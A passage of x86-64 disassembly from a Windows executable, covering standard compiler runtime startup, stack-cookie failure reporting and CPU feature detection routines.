   140008727:	03 c1                	add    %ecx,%eax
   140008729:	4c 3b c0             	cmp    %rax,%r8
   14000872c:	72 08                	jb     0x140008736
   14000872e:	48 83 c2 28          	add    $0x28,%rdx
   140008732:	eb df                	jmp    0x140008713
   140008734:	33 d2                	xor    %edx,%edx
   140008736:	48 85 d2             	test   %rdx,%rdx
   140008739:	75 04                	jne    0x14000873f
   14000873b:	32 c0                	xor    %al,%al
   14000873d:	eb 14                	jmp    0x140008753
   14000873f:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140008743:	7d 04                	jge    0x140008749
   140008745:	32 c0                	xor    %al,%al
   140008747:	eb 0a                	jmp    0x140008753
   140008749:	b0 01                	mov    $0x1,%al
   14000874b:	eb 06                	jmp    0x140008753
   14000874d:	32 c0                	xor    %al,%al
   14000874f:	eb 02                	jmp    0x140008753
   140008751:	32 c0                	xor    %al,%al
   140008753:	48 83 c4 18          	add    $0x18,%rsp
   140008757:	c3                   	ret
   140008758:	40 53                	rex push %rbx
   14000875a:	48 83 ec 20          	sub    $0x20,%rsp
   14000875e:	8a d9                	mov    %cl,%bl
   140008760:	e8 9f 07 00 00       	call   0x140008f04
   140008765:	33 d2                	xor    %edx,%edx
   140008767:	85 c0                	test   %eax,%eax
   140008769:	74 0b                	je     0x140008776
   14000876b:	84 db                	test   %bl,%bl
   14000876d:	75 07                	jne    0x140008776
   14000876f:	48 87 15 72 e0 01 00 	xchg   %rdx,0x1e072(%rip)        # 0x1400267e8
   140008776:	48 83 c4 20          	add    $0x20,%rsp
   14000877a:	5b                   	pop    %rbx
   14000877b:	c3                   	ret
   14000877c:	40 53                	rex push %rbx
   14000877e:	48 83 ec 20          	sub    $0x20,%rsp
   140008782:	80 3d 67 e0 01 00 00 	cmpb   $0x0,0x1e067(%rip)        # 0x1400267f0
   140008789:	8a d9                	mov    %cl,%bl
   14000878b:	74 04                	je     0x140008791
   14000878d:	84 d2                	test   %dl,%dl
   14000878f:	75 0c                	jne    0x14000879d
   140008791:	e8 7a 0a 00 00       	call   0x140009210
   140008796:	8a cb                	mov    %bl,%cl
   140008798:	e8 73 0a 00 00       	call   0x140009210
   14000879d:	b0 01                	mov    $0x1,%al
   14000879f:	48 83 c4 20          	add    $0x20,%rsp
   1400087a3:	5b                   	pop    %rbx
   1400087a4:	c3                   	ret
   1400087a5:	cc                   	int3
   1400087a6:	cc                   	int3
   1400087a7:	cc                   	int3
   1400087a8:	40 53                	rex push %rbx
   1400087aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400087ae:	48 83 3d 42 e0 01 00 	cmpq   $0xffffffffffffffff,0x1e042(%rip)        # 0x1400267f8
   1400087b5:	ff 
   1400087b6:	48 8b d9             	mov    %rcx,%rbx
   1400087b9:	75 07                	jne    0x1400087c2
   1400087bb:	e8 55 0d 00 00       	call   0x140009515
   1400087c0:	eb 0f                	jmp    0x1400087d1
   1400087c2:	48 8b d3             	mov    %rbx,%rdx
   1400087c5:	48 8d 0d 2c e0 01 00 	lea    0x1e02c(%rip),%rcx        # 0x1400267f8
   1400087cc:	e8 3e 0d 00 00       	call   0x14000950f
   1400087d1:	33 d2                	xor    %edx,%edx
   1400087d3:	85 c0                	test   %eax,%eax
   1400087d5:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400087d9:	48 8b c2             	mov    %rdx,%rax
   1400087dc:	48 83 c4 20          	add    $0x20,%rsp
   1400087e0:	5b                   	pop    %rbx
   1400087e1:	c3                   	ret
   1400087e2:	cc                   	int3
   1400087e3:	cc                   	int3
   1400087e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400087e8:	e8 bb ff ff ff       	call   0x1400087a8
   1400087ed:	48 f7 d8             	neg    %rax
   1400087f0:	1b c0                	sbb    %eax,%eax
   1400087f2:	f7 d8                	neg    %eax
   1400087f4:	ff c8                	dec    %eax
   1400087f6:	48 83 c4 28          	add    $0x28,%rsp
   1400087fa:	c3                   	ret
   1400087fb:	cc                   	int3
   1400087fc:	e9 3f 09 00 00       	jmp    0x140009140
   140008801:	cc                   	int3
   140008802:	cc                   	int3
   140008803:	cc                   	int3
   140008804:	40 53                	rex push %rbx
   140008806:	48 83 ec 20          	sub    $0x20,%rsp
   14000880a:	48 8d 05 07 2d 00 00 	lea    0x2d07(%rip),%rax        # 0x14000b518
   140008811:	48 8b d9             	mov    %rcx,%rbx
   140008814:	48 89 01             	mov    %rax,(%rcx)
   140008817:	f6 c2 01             	test   $0x1,%dl
   14000881a:	74 0a                	je     0x140008826
   14000881c:	ba 18 00 00 00       	mov    $0x18,%edx
   140008821:	e8 d6 ff ff ff       	call   0x1400087fc
   140008826:	48 8b c3             	mov    %rbx,%rax
   140008829:	48 83 c4 20          	add    $0x20,%rsp
   14000882d:	5b                   	pop    %rbx
   14000882e:	c3                   	ret
   14000882f:	cc                   	int3
   140008830:	40 53                	rex push %rbx
   140008832:	48 83 ec 20          	sub    $0x20,%rsp
   140008836:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000883b:	e8 e7 0c 00 00       	call   0x140009527
   140008840:	e8 b3 09 00 00       	call   0x1400091f8
   140008845:	8b c8                	mov    %eax,%ecx
   140008847:	e8 05 0d 00 00       	call   0x140009551
   14000884c:	e8 1f 08 00 00       	call   0x140009070
   140008851:	8b d8                	mov    %eax,%ebx
   140008853:	e8 23 0d 00 00       	call   0x14000957b
   140008858:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000885d:	89 18                	mov    %ebx,(%rax)
   14000885f:	e8 d0 fd ff ff       	call   0x140008634
   140008864:	84 c0                	test   %al,%al
   140008866:	74 73                	je     0x1400088db
   140008868:	e8 ef 09 00 00       	call   0x14000925c
   14000886d:	48 8d 0d 24 0a 00 00 	lea    0xa24(%rip),%rcx        # 0x140009298
   140008874:	e8 6b ff ff ff       	call   0x1400087e4
   140008879:	e8 7e 06 00 00       	call   0x140008efc
   14000887e:	8b c8                	mov    %eax,%ecx
   140008880:	e8 78 0c 00 00       	call   0x1400094fd
   140008885:	85 c0                	test   %eax,%eax
   140008887:	75 52                	jne    0x1400088db
   140008889:	e8 72 09 00 00       	call   0x140009200
   14000888e:	e8 ad 09 00 00       	call   0x140009240
   140008893:	85 c0                	test   %eax,%eax
   140008895:	74 0c                	je     0x1400088a3
   140008897:	48 8d 0d d2 07 00 00 	lea    0x7d2(%rip),%rcx        # 0x140009070
   14000889e:	e8 8a 0c 00 00       	call   0x14000952d
   1400088a3:	e8 94 08 00 00       	call   0x14000913c
   1400088a8:	e8 8f 08 00 00       	call   0x14000913c
   1400088ad:	e8 be 07 00 00       	call   0x140009070
   1400088b2:	8b c8                	mov    %eax,%ecx
   1400088b4:	e8 b6 0c 00 00       	call   0x14000956f
   1400088b9:	e8 52 09 00 00       	call   0x140009210
   1400088be:	84 c0                	test   %al,%al
   1400088c0:	74 05                	je     0x1400088c7
   1400088c2:	e8 3c 0c 00 00       	call   0x140009503
   1400088c7:	e8 a4 07 00 00       	call   0x140009070
   1400088cc:	e8 97 07 00 00       	call   0x140009068
   1400088d1:	85 c0                	test   %eax,%eax
   1400088d3:	75 06                	jne    0x1400088db
   1400088d5:	48 83 c4 20          	add    $0x20,%rsp
   1400088d9:	5b                   	pop    %rbx
   1400088da:	c3                   	ret
   1400088db:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400088e0:	e8 37 06 00 00       	call   0x140008f1c
   1400088e5:	cc                   	int3
   1400088e6:	cc                   	int3
   1400088e7:	cc                   	int3
   1400088e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400088ec:	e8 33 09 00 00       	call   0x140009224
   1400088f1:	33 c0                	xor    %eax,%eax
   1400088f3:	48 83 c4 28          	add    $0x28,%rsp
   1400088f7:	c3                   	ret
   1400088f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400088fc:	e8 c7 07 00 00       	call   0x1400090c8
   140008901:	e8 6a 07 00 00       	call   0x140009070
   140008906:	8b c8                	mov    %eax,%ecx
   140008908:	48 83 c4 28          	add    $0x28,%rsp
   14000890c:	e9 64 0c 00 00       	jmp    0x140009575
   140008911:	cc                   	int3
   140008912:	cc                   	int3
   140008913:	cc                   	int3
   140008914:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008919:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000891e:	57                   	push   %rdi
   14000891f:	48 83 ec 30          	sub    $0x30,%rsp
   140008923:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008928:	e8 cb fc ff ff       	call   0x1400085f8
   14000892d:	84 c0                	test   %al,%al
   14000892f:	0f 84 36 01 00 00    	je     0x140008a6b
   140008935:	40 32 f6             	xor    %sil,%sil
   140008938:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   14000893d:	e8 7a fc ff ff       	call   0x1400085bc
   140008942:	8a d8                	mov    %al,%bl
   140008944:	8b 0d 96 de 01 00    	mov    0x1de96(%rip),%ecx        # 0x1400267e0
   14000894a:	83 f9 01             	cmp    $0x1,%ecx
   14000894d:	0f 84 23 01 00 00    	je     0x140008a76
   140008953:	85 c9                	test   %ecx,%ecx
   140008955:	75 4a                	jne    0x1400089a1
   140008957:	c7 05 7f de 01 00 01 	movl   $0x1,0x1de7f(%rip)        # 0x1400267e0
   14000895e:	00 00 00 
   140008961:	48 8d 15 68 2b 00 00 	lea    0x2b68(%rip),%rdx        # 0x14000b4d0
   140008968:	48 8d 0d 49 2b 00 00 	lea    0x2b49(%rip),%rcx        # 0x14000b4b8
   14000896f:	e8 cb 0b 00 00       	call   0x14000953f
   140008974:	85 c0                	test   %eax,%eax
   140008976:	74 0a                	je     0x140008982
   140008978:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000897d:	e9 d9 00 00 00       	jmp    0x140008a5b
   140008982:	48 8d 15 27 2b 00 00 	lea    0x2b27(%rip),%rdx        # 0x14000b4b0
   140008989:	48 8d 0d 98 2a 00 00 	lea    0x2a98(%rip),%rcx        # 0x14000b428
   140008990:	e8 a4 0b 00 00       	call   0x140009539
   140008995:	c7 05 41 de 01 00 02 	movl   $0x2,0x1de41(%rip)        # 0x1400267e0
   14000899c:	00 00 00 
   14000899f:	eb 08                	jmp    0x1400089a9
   1400089a1:	40 b6 01             	mov    $0x1,%sil
   1400089a4:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   1400089a9:	8a cb                	mov    %bl,%cl
   1400089ab:	e8 a8 fd ff ff       	call   0x140008758
   1400089b0:	e8 97 08 00 00       	call   0x14000924c
   1400089b5:	48 8b d8             	mov    %rax,%rbx
   1400089b8:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400089bc:	74 1e                	je     0x1400089dc
   1400089be:	48 8b c8             	mov    %rax,%rcx
   1400089c1:	e8 fa fc ff ff       	call   0x1400086c0
   1400089c6:	84 c0                	test   %al,%al
   1400089c8:	74 12                	je     0x1400089dc
   1400089ca:	45 33 c0             	xor    %r8d,%r8d
   1400089cd:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400089d1:	33 c9                	xor    %ecx,%ecx
   1400089d3:	48 8b 03             	mov    (%rbx),%rax
   1400089d6:	ff 15 24 2a 00 00    	call   *0x2a24(%rip)        # 0x14000b400
   1400089dc:	e8 73 08 00 00       	call   0x140009254
   1400089e1:	48 8b d8             	mov    %rax,%rbx
   1400089e4:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400089e8:	74 14                	je     0x1400089fe
   1400089ea:	48 8b c8             	mov    %rax,%rcx
   1400089ed:	e8 ce fc ff ff       	call   0x1400086c0
   1400089f2:	84 c0                	test   %al,%al
   1400089f4:	74 08                	je     0x1400089fe
   1400089f6:	48 8b 0b             	mov    (%rbx),%rcx
   1400089f9:	e8 6b 0b 00 00       	call   0x140009569
   1400089fe:	e8 30 0b 00 00       	call   0x140009533
   140008a03:	48 8b f8             	mov    %rax,%rdi
   140008a06:	e8 52 0b 00 00       	call   0x14000955d
   140008a0b:	48 8b 18             	mov    (%rax),%rbx
   140008a0e:	e8 44 0b 00 00       	call   0x140009557
   140008a13:	4c 8b c7             	mov    %rdi,%r8
   140008a16:	48 8b d3             	mov    %rbx,%rdx
   140008a19:	8b 08                	mov    (%rax),%ecx
   140008a1b:	e8 00 ca ff ff       	call   0x140005420
   140008a20:	8b d8                	mov    %eax,%ebx
   140008a22:	e8 4d 06 00 00       	call   0x140009074
   140008a27:	84 c0                	test   %al,%al
   140008a29:	74 55                	je     0x140008a80
   140008a2b:	40 84 f6             	test   %sil,%sil
   140008a2e:	75 05                	jne    0x140008a35
   140008a30:	e8 e6 0a 00 00       	call   0x14000951b
   140008a35:	33 d2                	xor    %edx,%edx
   140008a37:	b1 01                	mov    $0x1,%cl
   140008a39:	e8 3e fd ff ff       	call   0x14000877c
   140008a3e:	8b c3                	mov    %ebx,%eax
   140008a40:	eb 19                	jmp    0x140008a5b
   140008a42:	8b d8                	mov    %eax,%ebx
   140008a44:	e8 2b 06 00 00       	call   0x140009074
   140008a49:	84 c0                	test   %al,%al
   140008a4b:	74 3b                	je     0x140008a88
   140008a4d:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140008a52:	75 05                	jne    0x140008a59
   140008a54:	e8 0a 0b 00 00       	call   0x140009563
   140008a59:	8b c3                	mov    %ebx,%eax
   140008a5b:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008a60:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008a65:	48 83 c4 30          	add    $0x30,%rsp
   140008a69:	5f                   	pop    %rdi
   140008a6a:	c3                   	ret
   140008a6b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008a70:	e8 a7 04 00 00       	call   0x140008f1c
   140008a75:	90                   	nop
   140008a76:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008a7b:	e8 9c 04 00 00       	call   0x140008f1c
   140008a80:	8b cb                	mov    %ebx,%ecx
   140008a82:	e8 be 0a 00 00       	call   0x140009545
   140008a87:	90                   	nop
   140008a88:	8b cb                	mov    %ebx,%ecx
   140008a8a:	e8 bc 0a 00 00       	call   0x14000954b
   140008a8f:	90                   	nop
   140008a90:	48 83 ec 28          	sub    $0x28,%rsp
   140008a94:	e8 af 06 00 00       	call   0x140009148
   140008a99:	48 83 c4 28          	add    $0x28,%rsp
   140008a9d:	e9 72 fe ff ff       	jmp    0x140008914
   140008aa2:	cc                   	int3
   140008aa3:	cc                   	int3
   140008aa4:	40 53                	rex push %rbx
   140008aa6:	48 83 ec 20          	sub    $0x20,%rsp
   140008aaa:	48 8b d9             	mov    %rcx,%rbx
   140008aad:	33 c9                	xor    %ecx,%ecx
   140008aaf:	ff 15 8b 25 00 00    	call   *0x258b(%rip)        # 0x14000b040
   140008ab5:	48 8b cb             	mov    %rbx,%rcx
   140008ab8:	ff 15 7a 25 00 00    	call   *0x257a(%rip)        # 0x14000b038
   140008abe:	ff 15 84 25 00 00    	call   *0x2584(%rip)        # 0x14000b048
   140008ac4:	48 8b c8             	mov    %rax,%rcx
   140008ac7:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140008acc:	48 83 c4 20          	add    $0x20,%rsp
   140008ad0:	5b                   	pop    %rbx
   140008ad1:	48 ff 25 78 25 00 00 	rex.W jmp *0x2578(%rip)        # 0x14000b050
   140008ad8:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140008add:	48 83 ec 38          	sub    $0x38,%rsp
   140008ae1:	b9 17 00 00 00       	mov    $0x17,%ecx
   140008ae6:	ff 15 6c 25 00 00    	call   *0x256c(%rip)        # 0x14000b058
   140008aec:	85 c0                	test   %eax,%eax
   140008aee:	74 07                	je     0x140008af7
   140008af0:	b9 02 00 00 00       	mov    $0x2,%ecx
   140008af5:	cd 29                	int    $0x29
   140008af7:	48 8d 0d d2 dd 01 00 	lea    0x1ddd2(%rip),%rcx        # 0x1400268d0
   140008afe:	e8 a9 00 00 00       	call   0x140008bac
   140008b03:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140008b08:	48 89 05 b9 de 01 00 	mov    %rax,0x1deb9(%rip)        # 0x1400269c8
   140008b0f:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140008b14:	48 83 c0 08          	add    $0x8,%rax
   140008b18:	48 89 05 49 de 01 00 	mov    %rax,0x1de49(%rip)        # 0x140026968
   140008b1f:	48 8b 05 a2 de 01 00 	mov    0x1dea2(%rip),%rax        # 0x1400269c8
   140008b26:	48 89 05 13 dd 01 00 	mov    %rax,0x1dd13(%rip)        # 0x140026840
   140008b2d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140008b32:	48 89 05 17 de 01 00 	mov    %rax,0x1de17(%rip)        # 0x140026950
   140008b39:	c7 05 ed dc 01 00 09 	movl   $0xc0000409,0x1dced(%rip)        # 0x140026830
   140008b40:	04 00 c0 
   140008b43:	c7 05 e7 dc 01 00 01 	movl   $0x1,0x1dce7(%rip)        # 0x140026834
   140008b4a:	00 00 00 
   140008b4d:	c7 05 f1 dc 01 00 01 	movl   $0x1,0x1dcf1(%rip)        # 0x140026848
   140008b54:	00 00 00 
   140008b57:	b8 08 00 00 00       	mov    $0x8,%eax
   140008b5c:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140008b60:	48 8d 0d e9 dc 01 00 	lea    0x1dce9(%rip),%rcx        # 0x140026850
   140008b67:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140008b6e:	00 
   140008b6f:	b8 08 00 00 00       	mov    $0x8,%eax
   140008b74:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140008b78:	48 8b 0d c1 94 00 00 	mov    0x94c1(%rip),%rcx        # 0x140012040
   140008b7f:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140008b84:	b8 08 00 00 00       	mov    $0x8,%eax
   140008b89:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140008b8d:	48 8b 0d ec 94 00 00 	mov    0x94ec(%rip),%rcx        # 0x140012080
   140008b94:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140008b99:	48 8d 0d 80 29 00 00 	lea    0x2980(%rip),%rcx        # 0x14000b520
   140008ba0:	e8 ff fe ff ff       	call   0x140008aa4
   140008ba5:	90                   	nop
   140008ba6:	48 83 c4 38          	add    $0x38,%rsp
   140008baa:	c3                   	ret
   140008bab:	cc                   	int3
   140008bac:	40 53                	rex push %rbx
   140008bae:	56                   	push   %rsi
   140008baf:	57                   	push   %rdi
   140008bb0:	48 83 ec 40          	sub    $0x40,%rsp
   140008bb4:	48 8b d9             	mov    %rcx,%rbx
   140008bb7:	ff 15 db 24 00 00    	call   *0x24db(%rip)        # 0x14000b098
   140008bbd:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140008bc4:	33 ff                	xor    %edi,%edi
   140008bc6:	45 33 c0             	xor    %r8d,%r8d
   140008bc9:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140008bce:	48 8b ce             	mov    %rsi,%rcx
   140008bd1:	ff 15 51 24 00 00    	call   *0x2451(%rip)        # 0x14000b028
   140008bd7:	48 85 c0             	test   %rax,%rax
   140008bda:	74 3c                	je     0x140008c18
   140008bdc:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140008be1:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140008be6:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140008bed:	00 00 
   140008bef:	4c 8b c8             	mov    %rax,%r9
   140008bf2:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008bf7:	4c 8b c6             	mov    %rsi,%r8
   140008bfa:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140008bff:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140008c04:	33 c9                	xor    %ecx,%ecx
   140008c06:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008c0b:	ff 15 1f 24 00 00    	call   *0x241f(%rip)        # 0x14000b030
   140008c11:	ff c7                	inc    %edi
   140008c13:	83 ff 02             	cmp    $0x2,%edi
   140008c16:	7c ae                	jl     0x140008bc6
   140008c18:	48 83 c4 40          	add    $0x40,%rsp
   140008c1c:	5f                   	pop    %rdi
   140008c1d:	5e                   	pop    %rsi
   140008c1e:	5b                   	pop    %rbx
   140008c1f:	c3                   	ret
   140008c20:	48 8d 05 39 29 00 00 	lea    0x2939(%rip),%rax        # 0x14000b560
   140008c27:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140008c2e:	00 
   140008c2f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140008c33:	48 8d 05 16 29 00 00 	lea    0x2916(%rip),%rax        # 0x14000b550
   140008c3a:	48 89 01             	mov    %rax,(%rcx)
   140008c3d:	48 8b c1             	mov    %rcx,%rax
   140008c40:	c3                   	ret
   140008c41:	cc                   	int3
   140008c42:	cc                   	int3
   140008c43:	cc                   	int3
   140008c44:	48 83 ec 48          	sub    $0x48,%rsp
   140008c48:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008c4d:	e8 ce ff ff ff       	call   0x140008c20
   140008c52:	48 8d 15 cf 72 00 00 	lea    0x72cf(%rip),%rdx        # 0x14000ff28
   140008c59:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008c5e:	e8 70 08 00 00       	call   0x1400094d3
   140008c63:	cc                   	int3
   140008c64:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008c69:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140008c6e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008c73:	57                   	push   %rdi
   140008c74:	48 83 ec 10          	sub    $0x10,%rsp
   140008c78:	33 c0                	xor    %eax,%eax
   140008c7a:	33 c9                	xor    %ecx,%ecx
   140008c7c:	0f a2                	cpuid
   140008c7e:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140008c84:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140008c8a:	0b d1                	or     %ecx,%edx
   140008c8c:	8b e8                	mov    %eax,%ebp
   140008c8e:	b8 01 00 00 00       	mov    $0x1,%eax
   140008c93:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140008c99:	0b d3                	or     %ebx,%edx
   140008c9b:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140008c9e:	0f a2                	cpuid
   140008ca0:	8b f9                	mov    %ecx,%edi
   140008ca2:	75 5e                	jne    0x140008d02
   140008ca4:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140008ca9:	48 c7 05 e4 93 00 00 	movq   $0x8000,0x93e4(%rip)        # 0x140012098
   140008cb0:	00 80 00 00 
   140008cb4:	48 c7 05 e1 93 00 00 	movq   $0xffffffffffffffff,0x93e1(%rip)        # 0x1400120a0
   140008cbb:	ff ff ff ff 
   140008cbf:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140008cc4:	74 28                	je     0x140008cee
   140008cc6:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140008ccb:	74 21                	je     0x140008cee
   140008ccd:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140008cd2:	74 1a                	je     0x140008cee
   140008cd4:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140008cd9:	83 f8 20             	cmp    $0x20,%eax
   140008cdc:	77 24                	ja     0x140008d02
   140008cde:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140008ce5:	00 00 00 
   140008ce8:	48 0f a3 c1          	bt     %rax,%rcx
   140008cec:	73 14                	jae    0x140008d02
   140008cee:	44 8b 05 af e0 01 00 	mov    0x1e0af(%rip),%r8d        # 0x140026da4
   140008cf5:	41 83 c8 01          	or     $0x1,%r8d
   140008cf9:	44 89 05 a4 e0 01 00 	mov    %r8d,0x1e0a4(%rip)        # 0x140026da4
   140008d00:	eb 07                	jmp    0x140008d09
   140008d02:	44 8b 05 9b e0 01 00 	mov    0x1e09b(%rip),%r8d        # 0x140026da4
   140008d09:	45 33 c9             	xor    %r9d,%r9d
   140008d0c:	41 8b f1             	mov    %r9d,%esi
   140008d0f:	45 8b d1             	mov    %r9d,%r10d
   140008d12:	45 8b d9             	mov    %r9d,%r11d
   140008d15:	83 fd 07             	cmp    $0x7,%ebp
   140008d18:	7c 40                	jl     0x140008d5a
   140008d1a:	41 8d 41 07          	lea    0x7(%r9),%eax
   140008d1e:	33 c9                	xor    %ecx,%ecx
   140008d20:	0f a2                	cpuid
   140008d22:	8b f2                	mov    %edx,%esi
   140008d24:	44 8b cb             	mov    %ebx,%r9d
   140008d27:	0f ba e3 09          	bt     $0x9,%ebx
   140008d2b:	73 0b                	jae    0x140008d38
   140008d2d:	41 83 c8 02          	or     $0x2,%r8d
   140008d31:	44 89 05 6c e0 01 00 	mov    %r8d,0x1e06c(%rip)        # 0x140026da4
   140008d38:	83 f8 01             	cmp    $0x1,%eax
   140008d3b:	7c 0d                	jl     0x140008d4a
   140008d3d:	b8 07 00 00 00       	mov    $0x7,%eax
   140008d42:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140008d45:	0f a2                	cpuid
   140008d47:	44 8b d2             	mov    %edx,%r10d
   140008d4a:	b8 24 00 00 00       	mov    $0x24,%eax
   140008d4f:	3b e8                	cmp    %eax,%ebp
   140008d51:	7c 07                	jl     0x140008d5a
   140008d53:	33 c9                	xor    %ecx,%ecx
   140008d55:	0f a2                	cpuid
   140008d57:	44 8b db             	mov    %ebx,%r11d
   140008d5a:	48 8b 05 27 93 00 00 	mov    0x9327(%rip),%rax        # 0x140012088
   140008d61:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140008d65:	c7 05 21 93 00 00 01 	movl   $0x1,0x9321(%rip)        # 0x140012090
   140008d6c:	00 00 00 
   140008d6f:	c7 05 1b 93 00 00 02 	movl   $0x2,0x931b(%rip)        # 0x140012094
   140008d76:	00 00 00 
   140008d79:	48 89 05 08 93 00 00 	mov    %rax,0x9308(%rip)        # 0x140012088
   140008d80:	0f ba e7 14          	bt     $0x14,%edi
   140008d84:	73 1f                	jae    0x140008da5
   140008d86:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140008d8a:	c7 05 fc 92 00 00 02 	movl   $0x2,0x92fc(%rip)        # 0x140012090
   140008d91:	00 00 00 
   140008d94:	48 89 05 ed 92 00 00 	mov    %rax,0x92ed(%rip)        # 0x140012088
   140008d9b:	c7 05 ef 92 00 00 06 	movl   $0x6,0x92ef(%rip)        # 0x140012094
   140008da2:	00 00 00 
   140008da5:	0f ba e7 1b          	bt     $0x1b,%edi
   140008da9:	0f 83 33 01 00 00    	jae    0x140008ee2
   140008daf:	33 c9                	xor    %ecx,%ecx
   140008db1:	0f 01 d0             	xgetbv
   140008db4:	48 c1 e2 20          	shl    $0x20,%rdx
   140008db8:	48 0b d0             	or     %rax,%rdx
   140008dbb:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140008dc0:	0f ba e7 1c          	bt     $0x1c,%edi
   140008dc4:	0f 83 fc 00 00 00    	jae    0x140008ec6
   140008dca:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008dcf:	24 06                	and    $0x6,%al
   140008dd1:	3c 06                	cmp    $0x6,%al
   140008dd3:	0f 85 ed 00 00 00    	jne    0x140008ec6
   140008dd9:	8b 05 b5 92 00 00    	mov    0x92b5(%rip),%eax        # 0x140012094
   140008ddf:	b2 e0                	mov    $0xe0,%dl
   140008de1:	83 c8 08             	or     $0x8,%eax
   140008de4:	c7 05 a2 92 00 00 03 	movl   $0x3,0x92a2(%rip)        # 0x140012090
   140008deb:	00 00 00 
   140008dee:	89 05 a0 92 00 00    	mov    %eax,0x92a0(%rip)        # 0x140012094
   140008df4:	41 f6 c1 20          	test   $0x20,%r9b
   140008df8:	74 62                	je     0x140008e5c
   140008dfa:	83 c8 20             	or     $0x20,%eax
   140008dfd:	c7 05 89 92 00 00 05 	movl   $0x5,0x9289(%rip)        # 0x140012090
   140008e04:	00 00 00 
   140008e07:	89 05 87 92 00 00    	mov    %eax,0x9287(%rip)        # 0x140012094
   140008e0d:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140008e12:	48 8b 05 6f 92 00 00 	mov    0x926f(%rip),%rax        # 0x140012088
   140008e19:	44 23 c9             	and    %ecx,%r9d
   140008e1c:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140008e20:	48 89 05 61 92 00 00 	mov    %rax,0x9261(%rip)        # 0x140012088
   140008e27:	44 3b c9             	cmp    %ecx,%r9d
   140008e2a:	75 37                	jne    0x140008e63
   140008e2c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008e31:	22 c2                	and    %dl,%al
   140008e33:	3a c2                	cmp    %dl,%al
   140008e35:	75 25                	jne    0x140008e5c
   140008e37:	48 8b 05 4a 92 00 00 	mov    0x924a(%rip),%rax        # 0x140012088
   140008e3e:	83 0d 4f 92 00 00 40 	orl    $0x40,0x924f(%rip)        # 0x140012094
   140008e45:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140008e49:	c7 05 3d 92 00 00 06 	movl   $0x6,0x923d(%rip)        # 0x140012090
   140008e50:	00 00 00 
   140008e53:	48 89 05 2e 92 00 00 	mov    %rax,0x922e(%rip)        # 0x140012088
   140008e5a:	eb 07                	jmp    0x140008e63
   140008e5c:	48 8b 05 25 92 00 00 	mov    0x9225(%rip),%rax        # 0x140012088
   140008e63:	0f ba e6 17          	bt     $0x17,%esi
   140008e67:	73 0c                	jae    0x140008e75
   140008e69:	48 0f ba f0 18       	btr    $0x18,%rax
   140008e6e:	48 89 05 13 92 00 00 	mov    %rax,0x9213(%rip)        # 0x140012088
